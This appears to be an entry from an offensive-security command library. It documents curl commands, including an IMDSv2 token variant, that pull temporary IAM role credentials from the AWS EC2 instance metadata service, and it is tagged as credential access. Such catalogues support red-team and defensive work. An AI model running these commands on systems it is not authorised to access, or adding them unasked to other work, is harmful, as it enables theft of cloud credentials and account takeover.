---
id: 2644a8c6-81b4-43d0-aa1f-f9974f326749
name: curl-retrieve-iam-role-credentials
type: command
executor: bash
data: >-
  curl
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
output: null
created_at: '2023-04-06T03:56:13.577299+00:00'
updated_at: '2023-04-10T20:21:03.075046+00:00'
platforms:
  - AWS
  - Linux
tags:
  - cloud
  - aws
  - credential-access
verified: true
validated: true
---

# curl-retrieve-iam-role-credentials

## Command

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

## Description

This command retrieves temporary security credentials (AccessKeyId, SecretAccessKey, Token) for a specified IAM role attached to the EC2 instance via the Instance Metadata Service. Replace ROLE_NAME with the actual role (e.g., from a prior list command). Use these credentials to authenticate to AWS services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ROLE_NAME | The name of the IAM role attached to the instance (e.g., MyInstanceRole) | Yes |

## Examples

### Basic Usage

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyInstanceRole
```

### With IMDSv2 Token

```bash
token=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $token" http://169.254.169.254/latest/meta-data/iam/security-credentials/MyInstanceRole
```

## Expected Output

A JSON object with credentials:
```json
{
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjMm...",
  "Expiration": "2023-04-06T10:00:00Z"
}
```

## Related

- [[procedures/Harvest-AWS-IAM-Credentials-from-Instance-Metadata]]
- [[commands/curl-list-iam-roles]]
